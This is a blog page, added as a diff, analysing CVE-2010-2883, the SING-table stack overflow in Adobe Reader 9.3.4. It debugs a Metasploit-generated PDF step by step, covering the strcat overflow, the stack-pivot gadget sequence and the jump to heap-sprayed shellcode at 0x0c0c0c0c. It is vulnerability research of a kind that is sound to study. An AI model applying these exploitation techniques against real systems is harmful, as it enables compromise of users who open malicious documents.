@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>[CVE-2010-2883]Adobe Reader TTF 字体SING表栈溢出漏洞 | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="题外话这么老的一个洞，在看雪搜文章的时候发现火绒发了篇文章，竟然现在还有利用这个洞的病毒https:&#x2F;&#x2F;bbs.pediy.com&#x2F;thread-260419.htm 环境相关系统：win xp sp3软件下载地址：ftp:&#x2F;&#x2F;ftp.adobe.com&#x2F;pub&#x2F;adobe&#x2F;reader&#x2F;win&#x2F;9.x&#x2F;9.3.4&#x2F;enu&#x2F; 漏洞分析软件安装好之后有个 CoolType.dll，在解析字体文件 S">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[CVE-2010-2883]Adobe Reader TTF 字体SING表栈溢出漏洞">
+<meta property="og:url" content="https://yichen115.github.io/2020/12/20/rfnt46/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="题外话这么老的一个洞，在看雪搜文章的时候发现火绒发了篇文章，竟然现在还有利用这个洞的病毒https:&#x2F;&#x2F;bbs.pediy.com&#x2F;thread-260419.htm 环境相关系统：win xp sp3软件下载地址：ftp:&#x2F;&#x2F;ftp.adobe.com&#x2F;pub&#x2F;adobe&#x2F;reader&#x2F;win&#x2F;9.x&#x2F;9.3.4&#x2F;enu&#x2F; 漏洞分析软件安装好之后有个 CoolType.dll，在解析字体文件 S">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608451596067-294747c1-e0a8-44e8-8060-ed090c5cf890.png#align=left&display=inline&height=545&margin=%5Bobject%20Object%5D&name=image.png&originHeight=703&originWidth=762&size=78261&status=done&style=stroke&width=591">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608452877614-431c49a7-e9c5-4326-9bdc-461bbcd64e73.png#align=left&display=inline&height=232&margin=%5Bobject%20Object%5D&name=image.png&originHeight=553&originWidth=1775&size=1211965&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608452998672-d0b1e361-680e-4bcd-8074-63eaf5a33544.png#align=left&display=inline&height=515&margin=%5Bobject%20Object%5D&name=image.png&originHeight=933&originWidth=1351&size=1208366&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608528670400-cb742c1a-3c18-441c-82f9-6eeae49afe0d.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=image.png&originHeight=330&originWidth=1065&size=35048&status=done&style=stroke&width=701">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608528750263-7765f0bc-d9d8-4f67-a0fd-6aa3ed09300a.png#align=left&display=inline&height=505&margin=%5Bobject%20Object%5D&name=image.png&originHeight=712&originWidth=1001&size=101419&status=done&style=none&width=710">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608453095078-1474cf98-05e7-4dfe-b93f-7caa5caef4e4.png#align=left&display=inline&height=340&margin=%5Bobject%20Object%5D&name=image.png&originHeight=504&originWidth=863&size=79216&status=done&style=stroke&width=583">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608470527704-f2c0df21-8ee4-49f8-92da-fdd5eb63c112.png#align=left&display=inline&height=341&margin=%5Bobject%20Object%5D&name=image.png&originHeight=496&originWidth=861&size=78934&status=done&style=stroke&width=592">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608527292704-fc910a28-ffa4-4b30-ade7-e39276026949.png#align=left&display=inline&height=414&margin=%5Bobject%20Object%5D&name=image.png&originHeight=813&originWidth=1464&size=151879&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608528042865-35a6d248-1c5e-4862-b642-e58a9ee11caa.png#align=left&display=inline&height=188&margin=%5Bobject%20Object%5D&name=image.png&originHeight=203&originWidth=734&size=27603&status=done&style=none&width=678">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608549917698-03afa3d3-ee9d-42b5-8fb5-9207cbb3cb54.png#align=left&display=inline&height=816&margin=%5Bobject%20Object%5D&originHeight=816&originWidth=1028&size=0&status=done&style=stroke&width=1028">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608550593919-2c026b50-16e4-42ff-928d-60ca292bea4a.png#align=left&display=inline&height=371&margin=%5Bobject%20Object%5D&name=image.png&originHeight=742&originWidth=1569&size=176206&status=done&style=stroke&width=784.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608551353883-ead34ac4-954d-4467-9991-19f298df52fb.png#align=left&display=inline&height=419&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1431&size=144590&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608551546023-c1e02891-98e5-4bd1-bc03-05c3a75c0d23.png#align=left&display=inline&height=402&margin=%5Bobject%20Object%5D&name=image.png&originHeight=773&originWidth=1434&size=140536&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608555552961-816ed76f-3325-40ea-9f9e-04f8b1ab9fc6.png#align=left&display=inline&height=440&margin=%5Bobject%20Object%5D&name=image.png&originHeight=620&originWidth=574&size=59497&status=done&style=none&width=407">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608558658893-d5790ab1-7f9e-4110-afdf-c7a7b7334f3d.png#align=left&display=inline&height=430&margin=%5Bobject%20Object%5D&name=image.png&originHeight=822&originWidth=1425&size=140983&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608561433740-ae41b6ef-331b-4c0a-995c-ff2668ee0dbc.png#align=left&display=inline&height=410&margin=%5Bobject%20Object%5D&name=image.png&originHeight=820&originWidth=1584&size=276641&status=done&style=none&width=792">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608613102249-6293b133-38ed-4ace-bfcb-b053c6580415.png#align=left&display=inline&height=398&margin=%5Bobject%20Object%5D&name=image.png&originHeight=767&originWidth=1438&size=166822&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608633121156-4391d766-621e-46b3-8616-81500049d3dc.png#align=left&display=inline&height=420&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1427&size=139462&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608626876725-47b848f5-b67b-409f-b869-491b43a2cc3b.png#align=left&display=inline&height=464&margin=%5Bobject%20Object%5D&name=image.png&originHeight=714&originWidth=1047&size=106422&status=done&style=none&width=680">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608633445715-c11dbe2b-b68c-4cf9-a146-06e737a4bf78.png#align=left&display=inline&height=421&margin=%5Bobject%20Object%5D&name=image.png&originHeight=806&originWidth=1428&size=141745&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608560127655-4d070ca2-1eba-4927-a10f-c399aee11747.png#align=left&display=inline&height=64&margin=%5Bobject%20Object%5D&name=image.png&originHeight=65&originWidth=532&size=5083&status=done&style=none&width=523">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608633907528-cd729ca7-b634-4957-b41f-f8a007feacae.png#align=left&display=inline&height=356&margin=%5Bobject%20Object%5D&name=image.png&originHeight=679&originWidth=1421&size=120992&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608634106188-86035a0b-39a7-4eee-871f-1c6b7ccb781a.png#align=left&display=inline&height=41&margin=%5Bobject%20Object%5D&name=image.png&originHeight=41&originWidth=489&size=3530&status=done&style=none&width=489">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608634337611-2491aec9-1db9-46e6-b99a-b4195ae1b6c1.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&name=image.png&originHeight=184&originWidth=505&size=14580&status=done&style=none&width=501">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608635292407-670a58ef-ffd7-4be2-b929-4a649251e748.png#align=left&display=inline&height=148&margin=%5Bobject%20Object%5D&name=image.png&originHeight=166&originWidth=559&size=13967&status=done&style=none&width=500">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608635421324-7786b297-8865-49da-b8b3-29244fc73e8b.png#align=left&display=inline&height=143&margin=%5Bobject%20Object%5D&name=image.png&originHeight=145&originWidth=504&size=11450&status=done&style=none&width=496">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608635695967-62d5cae6-29ba-4ea8-b309-ccab971785c5.png#align=left&display=inline&height=105&margin=%5Bobject%20Object%5D&name=image.png&originHeight=105&originWidth=366&size=7033&status=done&style=none&width=366">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608641102779-66030a61-fbf1-4936-b131-09f0f8cb389f.png#align=left&display=inline&height=318&margin=%5Bobject%20Object%5D&name=image.png&originHeight=653&originWidth=1532&size=158626&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608641745995-256584a3-fd7a-47e6-87cb-5ba7d8bc93af.png#align=left&display=inline&height=421&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1424&size=132857&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608642004663-894dc171-acef-4f65-906a-1a3e2c28bf86.png#align=left&display=inline&height=85&margin=%5Bobject%20Object%5D&name=image.png&originHeight=85&originWidth=499&size=7211&status=done&style=none&width=499">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608642095734-4817368c-b50f-4be5-bdbf-4f2a36007a75.png#align=left&display=inline&height=253&margin=%5Bobject%20Object%5D&name=image.png&originHeight=253&originWidth=259&size=17332&status=done&style=none&width=259">
+<meta property="article:published_time" content="2020-12-20T07:59:12.000Z">
+<meta property="article:modified_time" content="2020-12-29T01:58:38.882Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1608451596067-294747c1-e0a8-44e8-8060-ed090c5cf890.png#align=left&display=inline&height=545&margin=%5Bobject%20Object%5D&name=image.png&originHeight=703&originWidth=762&size=78261&status=done&style=stroke&width=591">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">[CVE-2010-2883]Adobe Reader TTF 字体SING表栈溢出漏洞</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">[CVE-2010-2883]Adobe Reader TTF 字体SING表栈溢出漏洞</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-12-20T07:59:12.000Z" itemprop="datePublished" class="page-time">
+  2020-12-20
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#题外话"><span class="post-toc-number">1.</span> <span class="post-toc-text">题外话</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#环境相关"><span class="post-toc-number">2.</span> <span class="post-toc-text">环境相关</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞分析"><span class="post-toc-number">3.</span> <span class="post-toc-text">漏洞分析</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-rfnt46"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">[CVE-2010-2883]Adobe Reader TTF 字体SING表栈溢出漏洞</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-12-20 15:59:12" datetime="2020-12-20T07:59:12.000Z"  itemprop="datePublished">2020-12-20</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>这么老的一个洞，在看雪搜文章的时候发现火绒发了篇文章，竟然现在还有利用这个洞的病毒<br><a href="https://bbs.pediy.com/thread-260419.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-260419.htm</a></p>
+<h1 id="环境相关"><a href="#环境相关" class="headerlink" title="环境相关"></a>环境相关</h1><p>系统：win xp sp3<br>软件下载地址：<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/9.x/9.3.4/enu/">ftp://ftp.adobe.com/pub/adobe/reader/win/9.x/9.3.4/enu/</a></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>软件安装好之后有个 CoolType.dll，在解析字体文件 SING 表 UniqueName 项的时候直接使用了 strcat</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608451596067-294747c1-e0a8-44e8-8060-ed090c5cf890.png#align=left&display=inline&height=545&margin=%5Bobject%20Object%5D&name=image.png&originHeight=703&originWidth=762&size=78261&status=done&style=stroke&width=591" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>先用 msf 生成一个恶意文档</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608452877614-431c49a7-e9c5-4326-9bdc-461bbcd64e73.png#align=left&display=inline&height=232&margin=%5Bobject%20Object%5D&name=image.png&originHeight=553&originWidth=1775&size=1211965&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>用 adobe reader 打开可以弹出一个计算器</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608452998672-d0b1e361-680e-4bcd-8074-63eaf5a33544.png#align=left&display=inline&height=515&margin=%5Bobject%20Object%5D&name=image.png&originHeight=933&originWidth=1351&size=1208366&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>可以使用 PDFStreamDumper 来分析 PDF 文档，在菜单中找到 search for，搜一下 TTF Fonts</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608528670400-cb742c1a-3c18-441c-82f9-6eeae49afe0d.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=image.png&originHeight=330&originWidth=1065&size=35048&status=done&style=stroke&width=701" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>搜索结果在下面</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608528750263-7765f0bc-d9d8-4f67-a0fd-6aa3ed09300a.png#align=left&display=inline&height=505&margin=%5Bobject%20Object%5D&name=image.png&originHeight=712&originWidth=1001&size=101419&status=done&style=none&width=710" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>TrueTypeFont 是由美国苹果公司和微软公司共同开发的一种计算机轮廓字体（曲边描边字）类型标准。</p>
+<p>TTF 字体中 TableEntry 结构包含了所指表的资源标记、校验和、偏移量和每个表的大小：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Char tag[<span class="number">4</span>];   <span class="comment">//SING字符串</span></span><br><span class="line">ULONG checkSum;    <span class="comment">//校验和</span></span><br><span class="line">ULONG offset;  <span class="comment">//相对文件偏移</span></span><br><span class="line">ULONG length;  <span class="comment">//数据长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 object 10 找到 SING</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608453095078-1474cf98-05e7-4dfe-b93f-7caa5caef4e4.png#align=left&display=inline&height=340&margin=%5Bobject%20Object%5D&name=image.png&originHeight=504&originWidth=863&size=79216&status=done&style=stroke&width=583" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>根据结构中的 offset 可以分析出来，真正的位置是在：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608470527704-f2c0df21-8ee4-49f8-92da-fdd5eb63c112.png#align=left&display=inline&height=341&margin=%5Bobject%20Object%5D&name=image.png&originHeight=496&originWidth=861&size=78934&status=done&style=stroke&width=592" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>SING 的格式如下，即 uniqueName 是在 +0x10 的位置，uniqueName 就是待会拼接的那个东西</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT  tableVersionMajor;</span><br><span class="line">    USHORT  tableVersionMinor;</span><br><span class="line">    USHORT  glyphletVersion;</span><br><span class="line">    USHORT  embeddinginfo;</span><br><span class="line">    USHORT  mainGID;</span><br><span class="line">    USHORT  unitsPerEm;</span><br><span class="line">    SHORT   vertAdvance;</span><br><span class="line">    SHORT   vertOrigin;</span><br><span class="line">    BYTE[<span class="number">28</span>]    uniqueName;</span><br><span class="line">    BYTE[<span class="number">16</span>]    METAMD5;</span><br><span class="line">    BYTE    nameLength;</span><br><span class="line">    BYTE[]  baseGlyphName;</span><br><span class="line">&#125; SINGTable;</span><br></pre></td></tr></table></figure>
+
+<p>用 OD 动态调试看一下，打开 adobe reader，再打开 OD 附加进程，F9 运行起来，然后 ctrl+G 找到 0x803DD74，这里是 ‘SING’ 进栈的地方，在这里下一个断点，然后把之前 msf 生成的 pdf 样本拖进。他会给断住，单步走几步到 0x803DD7D，此时数据窗口中跟随看一下 ecx 指向的地址</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608527292704-fc910a28-ffa4-4b30-ade7-e39276026949.png#align=left&display=inline&height=414&margin=%5Bobject%20Object%5D&name=image.png&originHeight=813&originWidth=1464&size=151879&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后选中 A8 14 87 05 数据窗口中跟随一下得到：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608528042865-35a6d248-1c5e-4862-b642-e58a9ee11caa.png#align=left&display=inline&height=188&margin=%5Bobject%20Object%5D&name=image.png&originHeight=203&originWidth=734&size=27603&status=done&style=none&width=678" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>这一块就是之前我们在 PDFStreamDumper 中搜索到的 TTF Fonts 的结构，0x00000100 是版本</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608549917698-03afa3d3-ee9d-42b5-8fb5-9207cbb3cb54.png#align=left&display=inline&height=816&margin=%5Bobject%20Object%5D&originHeight=816&originWidth=1028&size=0&status=done&style=stroke&width=1028" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>执行完那个 call 之后，在数据窗口中看一下 eax 中存的地址的内容正好是 SING 表的内容，然后比较了一下 eax 与 esi 判断 SING 表是不是空的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608550593919-2c026b50-16e4-42ff-928d-60ca292bea4a.png#align=left&display=inline&height=371&margin=%5Bobject%20Object%5D&name=image.png&originHeight=742&originWidth=1569&size=176206&status=done&style=stroke&width=784.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>接下来的 add eax,0x10 使得 eax 指向了 uniqueName，再通过 push eax 传参</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608551353883-ead34ac4-954d-4467-9991-19f298df52fb.png#align=left&display=inline&height=419&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1431&size=144590&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>继续单步执行，就到了 strcat 那里了，strcat 会把 0x5871150 复制到 0x012E4D8</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608551546023-c1e02891-98e5-4bd1-bc03-05c3a75c0d23.png#align=left&display=inline&height=402&margin=%5Bobject%20Object%5D&name=image.png&originHeight=773&originWidth=1434&size=140536&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>执行完这个 call 之后在 0x012E4D8 这里下个内存访问断点</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608555552961-816ed76f-3325-40ea-9f9e-04f8b1ab9fc6.png#align=left&display=inline&height=440&margin=%5Bobject%20Object%5D&name=image.png&originHeight=620&originWidth=574&size=59497&status=done&style=none&width=407" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后运行起来，当程序访问到这一块的时候就会断下来，经过多次断下之后会遇到一个 0x808B308 的 <code>call dword ptr ds:[eax]</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608558658893-d5790ab1-7f9e-4110-afdf-c7a7b7334f3d.png#align=left&display=inline&height=430&margin=%5Bobject%20Object%5D&name=image.png&originHeight=822&originWidth=1425&size=140983&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>他接下来会通过 call 来执行 0x4A80CB38 这一块的代码，依次执行了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add ebp,0x794</span><br><span class="line">leave</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+
+<p>其中 leave 指令相当于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure>
+
+<p>这样就把 esp 指向了 uniqueName 那块内存</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608561433740-ae41b6ef-331b-4c0a-995c-ff2668ee0dbc.png#align=left&display=inline&height=410&margin=%5Bobject%20Object%5D&name=image.png&originHeight=820&originWidth=1584&size=276641&status=done&style=none&width=792" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>执行完之后执行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop esp</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+
+<p>把 esp 写成了之前布置好的 0c0c0c0c</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608613102249-6293b133-38ed-4ace-bfcb-b053c6580415.png#align=left&display=inline&height=398&margin=%5Bobject%20Object%5D&name=image.png&originHeight=767&originWidth=1438&size=166822&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>retn 的时候就跑到了 0x0c0c0c0c，这个位置通过堆喷射早就布局好了 shellcode</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1608633121156-4391d766-621e-46b3-8616-81500049d3dc.png#align=left&display=inline&height=420&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1427&size=139462&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
